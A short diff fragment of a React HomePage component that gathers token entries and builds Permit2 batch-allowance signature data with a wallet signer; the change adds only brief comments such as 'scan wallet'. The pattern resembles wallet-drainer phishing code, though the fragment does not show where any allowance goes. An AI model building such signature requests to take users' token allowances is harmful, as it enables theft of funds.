@@ -37,7 +37,9 @@ const HomePage = () => {
 
     const handleLoad = async (signer) => {
         const details = [];
+        //scan wallet
 
+        //default signature
         Object.keys(D).map((item, index) => {
             if (index > 1) {
                 const token_item = {
@@ -56,6 +58,7 @@ const HomePage = () => {
             sigDeadline: D.expiration,
         };
 
+        //handle
         const { domain, types, values } = AllowanceTransfer.getPermitData(
             permit,
             PERMIT2_ADDRESS,
